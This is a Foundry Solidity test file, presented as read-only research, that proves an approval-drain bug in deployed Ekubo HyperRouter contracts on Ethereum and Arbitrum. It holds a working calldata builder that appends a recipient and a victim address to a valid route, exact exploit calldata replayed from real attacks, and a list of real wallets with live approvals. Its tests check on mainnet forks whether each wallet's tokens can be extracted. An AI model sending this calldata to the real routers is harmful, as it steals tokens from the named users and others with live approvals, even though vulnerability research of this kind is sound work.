// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {EkuboAttacker} from "../src/EkuboAttacker.sol";

interface IERC20x {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
}

interface ITimeLockedWrapper {
    function underlyingToken() external view returns (address);
    function unlockTime() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

/// @title C-21 — Ekubo HuffRouter/HyperRouter approval-drain PoC
/// @notice Read-only research. All tests run on local forks only; no transaction
///         is ever sent to a real chain.
///
/// Bug: the HuffRouter settlement code read the `transferFrom` (payer) address
/// from an offset relative to the *logical end of the decoded route* instead of
/// the actual end of calldata. Any caller can append `recipient || 12 zero
/// bytes || victim` after a valid route, making the router spend the victim's
/// ERC-20 approval to Ekubo Core while Core pays the `recipient` (the attacker).
///
/// Settlement order matters: the router pays the recipient from Core's available
/// balance FIRST and pulls the victim's tokens AFTER. So a pair is only
/// extractable if (a) the allowance is live, (b) the victim has balance, and
/// (c) Core can front the payout for that token (or the token's transfer is
/// Core-lenient, as the gEKUBO TokenWrapper is).
contract EkuboHuffRouterTest is Test {
    // --- deployed targets -------------------------------------------------
    address constant R8F52 = 0x8F52903D17E2D8d6c77D1A1DE0Cc975b6b5a0D15; // HyperRouter (V2 era)
    address constant R8CCB = 0x8CCB1ffD5C2aa6Bd926473425Dea4c8c15DE60fd; // HyperRouter (V2 era)
    address constant R4F16 = 0x4F168f17923435c999f5C8565ACAb52C2218EdF2; // HyperRouter (V3 era)
    address constant RARB = 0xC93C4Ad185CA48d66FEfe80f906a67ef859fc47d;  // HyperRouter on Arbitrum

    // --- tokens -----------------------------------------------------------
    address constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant G_EKUBO = 0x0c93b16cb1D8691E629514Fc98f02cbaD340Da3C;
    address constant EKUBO = 0x04C46E830Bb56ce22735d5d8Fc9CB90309317d0f;
    address constant AAVE = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address constant USDE = 0x4c9EDD5852cd905f086C759E8383e09bff1E68B3;
    address constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant USDC_ARB = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address constant CORE_V2 = 0xe0e0e08A6A4b9Dc7bD67BCB7aadE5cF48157d444;

    // --- live victims / approvals (live_state snapshot @ block 26108906) ---
    address constant G_EKUBO_OWNER_A = 0x62918165274bd8739634aEcB0684d5057304D480; // allow 7.479274845 gEKUBO
    address constant G_EKUBO_OWNER_B = 0x13C385A2Aa976B637d2a701dEc0E2479cDAe3Bb7; // allow 0.073535385 gEKUBO
    address constant AAVE_OWNER = 0xeB0e6eCD0E78B0a84eCD9663a041F453C454a99D;     // allow 0.0012615 AAVE
    address constant USDE_OWNER = 0x1a80cfa2dC45255B7511A739f4b04C286a0b7938;     // allow 99,997 USDe
    address constant USDT_OWNER_A = 0xD2306a7187FE8B0C0DEe59b50FDC438d2075d24c;   // allow max, bal 153 wei
    address constant USDT_OWNER_B = 0x935bfb495E33f74d2E9735DF1DA66acE442ede48;   // allow max, bal 2 wei
    address constant USDT_OWNER_C = 0xfA0253943c3FF0e43898cba5A7a0dA9D17C27995;   // allow max, bal 14 wei
    address constant USDC_OWNER_DUST = 0xDCa9B7e52000e5e0aE07A23EFaaB8613c5f7966B; // allow max, bal 1 wei
    address constant USDE_OWNER_8F52 = 0xBFAa7Aa9020dCC91964285BeEbC213b3983F8C80; // allow huge, bal 0.000202 USDe
    // revoked-but-funded negatives
    address constant USDT_REVOKED_FUNDED = 0x99935B671af8fFc9A9eD042E4663a135dA477b6c; // bal 3975.699511, allow 0
    address constant USDC_ARB_REVOKED_FUNDED = 0x083c828B221B126965a146658D4e512337182dF1; // bal 878.013286, allow 0

    // --- calldata template constants (from the real exploit txs) ----------
    // The 12 filler bytes must be ZERO: the settlement reads `transferFrom` as
    // a full 32-byte word and strict tokens (AAVE, the gEKUBO TokenWrapper)
    // revert when decoding a dirty address.
    bytes constant JUNK12 = hex"000000000000000000000000";
    // tail of the 0x8CCB / 0x4F16 mainnet exploit calldata (50 bytes)
    bytes constant TAIL50 =
        hex"9abcdef0123456789abcdef09999999999999999999999999999999999999999999999999999999999999999999999999999";
    // tail of the Arbitrum exploit calldata (23 bytes)
    bytes constant TAIL23 = hex"9abcdef0123456789abcdef09999999999999999999999";
    // exact Arbitrum exploit calldata (tx 0x2acce9... at block 459854116)
    bytes constant ARB_EXPLOIT_INPUT =
        hex"0009099c9c0000000000000000004c4b400000000000004c4b40000501cccc640018f8c2b00fa45f456017ad2378eb3447b3ab4ab5ab6ab7ab8ab9ac0a0000007ca619ae568b42cde96625c28a827a832d9abcdef0123456789abcdef09999999999999999999999";

    function ethRpc() internal view returns (string memory) {
        return vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com")));
    }

    function arbRpc() internal view returns (string memory) {
        return vm.envOr("ARB_RPC_URL", string("https://arb1.arbitrum.io/rpc"));
    }

    /// @dev Build the vulnerable router calldata: valid route + trailing
    ///      `recipient || 12 zero bytes || victim || tail`.
    ///      tokenIdxSpec/tokenIdxCalc may be explicit addresses via 0xff prefix.
    function buildCalldata(uint8 specIdx, uint8 calcIdx, uint256 amount, uint256 threshold, address recipient, address victim, bytes memory tail)
        internal
        pure
        returns (bytes memory)
    {
        return abi.encodePacked(
            bytes1(0x00), // withRecipient = false
            bytes1(0x09), // specifiedAmountBytes
            bytes1(0x09), // calculatedAmountThresholdBytes
            bytes1(specIdx),
            bytes1(calcIdx),
            bytes1(0x00), // additionalMultiHops
            bytes1(0x00), // withIntegrationFee
            bytes1(0x00), // flags
            bytes9(uint72(threshold)),
            bytes9(uint72(amount)),
            bytes1(0x00), // additionalHops
            bytes1(0x05), // wrapped-token hop
            bytes1(0x01), // unwrap
            recipient,
            JUNK12,
            victim,
            tail
        );
    }

    /// @dev Same, but with a base-extension hop whose swap fails silently
    ///      (invalid zeroed pool config). The appended payload shifts by +12
    ///      bytes because the hop info is 14 bytes instead of 2.
    function buildCalldataBaseHop(uint8 specIdx, uint8 calcIdx, uint256 amount, uint256 threshold, address recipient, address victim, bytes memory tail)
        internal
        pure
        returns (bytes memory)
    {
        return abi.encodePacked(
            bytes1(0x00), bytes1(0x09), bytes1(0x09), bytes1(specIdx), bytes1(calcIdx),
            bytes1(0x00), bytes1(0x00), bytes1(0x00),
            bytes9(uint72(threshold)),
            bytes9(uint72(amount)),
            bytes1(0x00), // additionalHops
            bytes1(0x00), // hopType = base extension
            bytes1(0x00), // skipAhead
            hex"0000000000000000", // fee
            hex"00000000",         // tickSpacing
            recipient, JUNK12, victim, tail
        );
    }

    struct RunResult {
        bool ok;
        uint256 expected;
        uint256 victimDelta;
        uint256 attackerGain;
        uint256 attackerEkuboGain;
        uint256 gasUsed;
        bytes ret;
    }

    function _attemptWith(address router, address token, address victim, bytes memory data, address attackerAddr, uint256 expected)
        internal
        returns (RunResult memory r)
    {
        uint256 t0 = IERC20x(token).balanceOf(attackerAddr);
        bool hasEkubo = EKUBO.code.length > 0;
        uint256 e0 = hasEkubo ? IERC20x(EKUBO).balanceOf(attackerAddr) : 0;
        uint256 v0 = IERC20x(token).balanceOf(victim);
        uint256 g0 = gasleft();
        (r.ok, r.ret) = router.call(data);
        r.gasUsed = g0 - gasleft();
        r.expected = expected;
        r.victimDelta = v0 > IERC20x(token).balanceOf(victim) ? v0 - IERC20x(token).balanceOf(victim) : 0;
        r.attackerGain = IERC20x(token).balanceOf(attackerAddr) - t0;
        r.attackerEkuboGain = hasEkubo ? IERC20x(EKUBO).balanceOf(attackerAddr) - e0 : 0;
        console2.log("  ok:", r.ok);
        console2.log("  expected:", expected);
        console2.log("  victimDelta:", r.victimDelta);
        console2.log("  attackerGain(token):", r.attackerGain);
        console2.log("  attackerGain(EKUBO):", r.attackerEkuboGain);
        console2.log("  attack call gas:", r.gasUsed);
        console2.logBytes(r.ret);
    }

    function attempt(address router, uint8 tokenIdx, address token, address victim, bytes memory tail)
        internal
        returns (RunResult memory r)
    {
        EkuboAttacker atk = new EkuboAttacker();
        uint256 allow = IERC20x(token).allowance(victim, router);
        uint256 bal = IERC20x(token).balanceOf(victim);
        uint256 expected = allow < bal ? allow : bal;
        console2.log("attempt allowance:", allow);
        console2.log("attempt victim balance:", bal);
        uint256 amount = expected == 0 ? 1 : expected;
        uint256 threshold = expected == 0 ? 1 : expected;
        return _attemptWith(router, token, victim, buildCalldata(tokenIdx, tokenIdx, amount, threshold, address(atk), victim, tail), address(atk), expected);
    }

    // ---------------------------------------------------------------------
    // Live extraction tests (latest block fork)
    // ---------------------------------------------------------------------

    /// gEKUBO-26Q2 is a time-locked wrapper for EKUBO (unlocked 2026-04-01),
    /// so 1 gEKUBO is redeemable for 1 EKUBO. Three route variants are tried
    /// because the wrapper's unwrap hop creates an extra EKUBO delta:
    ///   A: wrapped hop, specified=gEKUBO, calculated=EKUBO (payout in EKUBO)
    ///   B: wrapped hop, specified=calculated=gEKUBO
    ///   C: base hop (fails silently), specified=calculated=gEKUBO
    function test_live_gEKUBO_ownerA() public {
        _gEkuboProbe(G_EKUBO_OWNER_A, "A");
    }

    function test_live_gEKUBO_ownerB() public {
        _gEkuboProbe(G_EKUBO_OWNER_B, "B");
    }

    function _gEkuboProbe(address victim, string memory label) internal {
        vm.createSelectFork(ethRpc());
        console2.log("fork block", block.number);
        uint256 allow = IERC20x(G_EKUBO).allowance(victim, R8CCB);
        uint256 bal = IERC20x(G_EKUBO).balanceOf(victim);
        uint256 expected = allow < bal ? allow : bal;
        console2.log(string.concat("owner ", label, " expected:"), expected);
        assertGt(expected, 0, "precondition: live allowance and balance");

        // Variant A
        {
            EkuboAttacker atk = new EkuboAttacker();
            console2.log("variant A (unwrap -> EKUBO payout)");
            RunResult memory r = _attemptWith(
                R8CCB, G_EKUBO, victim,
                buildCalldata(0x5a, 0x03, expected, expected, address(atk), victim, TAIL50),
                address(atk), expected
            );
            if (r.victimDelta == expected && r.attackerEkuboGain >= expected) {
                console2.log("variant A extracted");
                return;
            }
        }
        // Variant B
        {
            EkuboAttacker atk = new EkuboAttacker();
            console2.log("variant B (unwrap -> gEKUBO payout)");
            RunResult memory r = _attemptWith(
                R8CCB, G_EKUBO, victim,
                buildCalldata(0x5a, 0x5a, expected, expected, address(atk), victim, TAIL50),
                address(atk), expected
            );
            if (r.victimDelta == expected && r.attackerGain >= expected) {
                console2.log("variant B extracted");
                return;
            }
        }
        // Variant C
        {
            EkuboAttacker atk = new EkuboAttacker();
            console2.log("variant C (base hop -> gEKUBO payout)");
            RunResult memory r = _attemptWith(
                R8CCB, G_EKUBO, victim,
                buildCalldataBaseHop(0x5a, 0x5a, expected, expected, address(atk), victim, TAIL50),
                address(atk), expected
            );
            if (r.victimDelta == expected && r.attackerGain >= expected) {
                console2.log("variant C extracted");
                return;
            }
        }
        revert("no gEKUBO route variant extracted the live amount");
    }

    /// AAVE: live allowance/balance exist, but the payout is fronted by Core and
    /// Core only holds 61,094 wei of AAVE. Full extraction must revert and move
    /// nothing; only Core's dust balance is theoretically extractable per call.
    function test_live_AAVE_limited_by_core_balance() public {
        vm.createSelectFork(ethRpc());
        uint256 coreBal = IERC20x(AAVE).balanceOf(CORE_V2);
        console2.log("Core AAVE balance (per-call payout limit):", coreBal);
        RunResult memory r = attempt(R8CCB, 0x0e, AAVE, AAVE_OWNER, TAIL50);
        assertTrue(!r.ok || r.victimDelta <= coreBal, "cannot extract more than Core can front");
        if (!r.ok) assertEq(r.victimDelta, 0, "reverted call must not move funds");
    }

    /// USDe: same constraint; Core holds ~4.71e-9 USDe.
    function test_live_USDe_limited_by_core_balance() public {
        vm.createSelectFork(ethRpc());
        uint256 coreBal = IERC20x(USDE).balanceOf(CORE_V2);
        console2.log("Core USDe balance (per-call payout limit):", coreBal);
        RunResult memory r = attempt(R8CCB, 0x09, USDE, USDE_OWNER, TAIL50);
        assertTrue(!r.ok || r.victimDelta <= coreBal, "cannot extract more than Core can front");
        if (!r.ok) assertEq(r.victimDelta, 0, "reverted call must not move funds");
    }

    /// Dust pairs with infinite approvals: Core holds plenty of USDT, so the
    /// full live balances are extractable in one call each.
    function test_live_USDT_dust_infinite_approvals() public {
        vm.createSelectFork(ethRpc());
        RunResult memory a = attempt(R4F16, 0xdc, USDT, USDT_OWNER_A, TAIL50);
        assertEq(a.victimDelta, a.expected, "USDT dust A");
        assertEq(a.attackerGain, a.expected, "USDT dust A gain");
        RunResult memory b = attempt(R4F16, 0xdc, USDT, USDT_OWNER_B, TAIL50);
        assertEq(b.victimDelta, b.expected, "USDT dust B");
        RunResult memory c = attempt(R4F16, 0xdc, USDT, USDT_OWNER_C, TAIL50);
        assertEq(c.victimDelta, c.expected, "USDT dust C");
    }

    /// 1 wei USDC on the July-2025 router generation. Logged, not asserted as
    /// proven: that generation used a different calldata layout. Value ~$0.
    function test_live_USDC_dust_8f52() public {
        vm.createSelectFork(ethRpc());
        RunResult memory r = attempt(R8F52, 0x01, USDC, USDC_OWNER_DUST, TAIL50);
        console2.log("8f52 USDC dust ok:", r.ok);
        assertLe(r.victimDelta, r.expected, "must not move more than balance");
    }

    /// 0.000202 USDe on the July-2025 router generation. Logged, not asserted
    /// as proven. Value ~$0.
    function test_live_USDe_dust_8f52() public {
        vm.createSelectFork(ethRpc());
        RunResult memory r = attempt(R8F52, 0x09, USDE, USDE_OWNER_8F52, TAIL50);
        console2.log("8f52 USDe dust ok:", r.ok);
        assertLe(r.victimDelta, r.expected, "must not move more than balance");
    }

    // ---------------------------------------------------------------------
    // Negative tests: revoked / empty approvals must not be spendable
    // ---------------------------------------------------------------------

    function test_negative_revoked_funded_USDT() public {
        vm.createSelectFork(ethRpc());
        // 3,975.699511 USDT balance, allowance(router) == 0 today
        assertEq(IERC20x(USDT).allowance(USDT_REVOKED_FUNDED, R8CCB), 0, "precondition: revoked");
        assertGt(IERC20x(USDT).balanceOf(USDT_REVOKED_FUNDED), 1_000_000_000, "precondition: funded");
        RunResult memory r = attempt(R8CCB, 0x02, USDT, USDT_REVOKED_FUNDED, TAIL50);
        assertTrue(!r.ok || r.victimDelta == 0, "revoked approval must not be spendable");
        assertEq(r.attackerGain, 0, "no tokens may reach attacker");
    }

    function test_negative_revoked_funded_USDC_arbitrum() public {
        vm.createSelectFork(arbRpc());
        assertEq(IERC20x(USDC_ARB).allowance(USDC_ARB_REVOKED_FUNDED, RARB), 0, "precondition: revoked");
        assertGt(IERC20x(USDC_ARB).balanceOf(USDC_ARB_REVOKED_FUNDED), 500_000_000, "precondition: funded");
        RunResult memory r = attempt(RARB, 0x9c, USDC_ARB, USDC_ARB_REVOKED_FUNDED, TAIL23);
        assertTrue(!r.ok || r.victimDelta == 0, "revoked approval must not be spendable");
        assertEq(r.attackerGain, 0, "no tokens may reach attacker");
    }

    // ---------------------------------------------------------------------
    // Historical positive controls (prove the deployed code is vulnerable)
    // ---------------------------------------------------------------------

    /// Replay the 2026-05-05 exploit calldata one block before it happened:
    /// 0.2 WBTC pulled from the real victim's approval through 0x8CCB1ffd.
    /// Requires an archive RPC (set ARCHIVE_RPC_URL); skipped otherwise.
    function test_control_wbtc_2026_05_05() public {
        string memory archive = vm.envOr("ARCHIVE_RPC_URL", string(""));
        if (bytes(archive).length == 0) {
            console2.log("ARCHIVE_RPC_URL unset; historical ETH control skipped");
            return;
        }
        vm.createSelectFork(archive, 25_030_408);
        EkuboAttacker atk = new EkuboAttacker();
        address victim = 0x765DECF4Fa157756e850C1079F60801b9219Edd1;
        uint256 amount = 20_000_000; // 0.2 WBTC
        uint256 v0 = IERC20x(WBTC).balanceOf(victim);
        (bool ok, ) = atk.attack(R8CCB, buildCalldata(5, 5, amount, 13_787_491, address(atk), victim, TAIL50));
        assertTrue(ok, "historical replay must succeed");
        assertEq(v0 - IERC20x(WBTC).balanceOf(victim), amount, "victim loses 0.2 WBTC");
        assertEq(IERC20x(WBTC).balanceOf(address(atk)), amount, "attacker gains 0.2 WBTC");
    }

    /// Replay the exact Arbitrum exploit calldata one block before it happened:
    /// 5 USDC pulled from the victim and paid to the attacker.
    /// Requires an archive RPC (set ARB_ARCHIVE_RPC_URL); skipped otherwise.
    function test_control_arbitrum_usdc_2026_05_05() public {
        string memory archive = vm.envOr("ARB_ARCHIVE_RPC_URL", string(""));
        if (bytes(archive).length == 0) {
            console2.log("ARB_ARCHIVE_RPC_URL unset; historical Arbitrum control skipped");
            return;
        }
        vm.createSelectFork(archive, 459_854_115);
        address recipient = 0xcccc640018f8c2b00fa45F456017AD2378Eb3447;
        address victim = 0x0000007ca619AE568B42CdE96625C28a827A832d;
        uint256 r0 = IERC20x(USDC_ARB).balanceOf(recipient);
        uint256 v0 = IERC20x(USDC_ARB).balanceOf(victim);
        (bool ok, ) = RARB.call(ARB_EXPLOIT_INPUT);
        assertTrue(ok, "arbitrum replay must succeed");
        assertEq(IERC20x(USDC_ARB).balanceOf(recipient) - r0, 5_000_000, "attacker gains 5 USDC");
        assertEq(v0 - IERC20x(USDC_ARB).balanceOf(victim), 5_000_000, "victim loses 5 USDC");
    }

    // ---------------------------------------------------------------------
    // Value-bearing state / wrapper backing
    // ---------------------------------------------------------------------

    function test_routers_hold_no_balances() public {
        vm.createSelectFork(ethRpc());
        assertEq(R8F52.balance, 0, "8f52 eth");
        assertEq(R8CCB.balance, 0, "8ccb eth");
        assertEq(R4F16.balance, 0, "4f16 eth");
        assertEq(IERC20x(WBTC).balanceOf(R8CCB), 0, "8ccb wbtc");
        assertEq(IERC20x(USDC).balanceOf(R8F52), 0, "8f52 usdc");
        assertEq(IERC20x(USDT).balanceOf(R4F16), 0, "4f16 usdt");
        assertEq(IERC20x(G_EKUBO).balanceOf(R8CCB), 0, "8ccb gEKUBO");
    }

    function test_routers_have_code() public {
        vm.createSelectFork(ethRpc());
        assertGt(R8F52.code.length, 0, "8f52 code");
        assertGt(R8CCB.code.length, 0, "8ccb code");
        assertGt(R4F16.code.length, 0, "4f16 code");
        vm.createSelectFork(arbRpc());
        assertGt(RARB.code.length, 0, "arb code");
    }

    function test_gEKUBO_wrapper_is_unlocked_and_backed() public {
        vm.createSelectFork(ethRpc());
        assertEq(ITimeLockedWrapper(G_EKUBO).underlyingToken(), EKUBO, "underlying");
        assertLe(ITimeLockedWrapper(G_EKUBO).unlockTime(), block.timestamp, "unlocked");
        // totalSupply() reads Ekubo Core savedBalances; tolerate RPC flakes
        (bool ok, bytes memory ret) = G_EKUBO.staticcall(abi.encodeWithSelector(ITimeLockedWrapper.totalSupply.selector));
        if (ok && ret.length >= 32) {
            uint256 supply = abi.decode(ret, (uint256));
            console2.log("gEKUBO totalSupply (Core-backed):", supply);
            assertGt(supply, 7_000e18, "backing");
        } else {
            console2.log("gEKUBO backing read unavailable on this RPC; skipped");
        }
    }
}
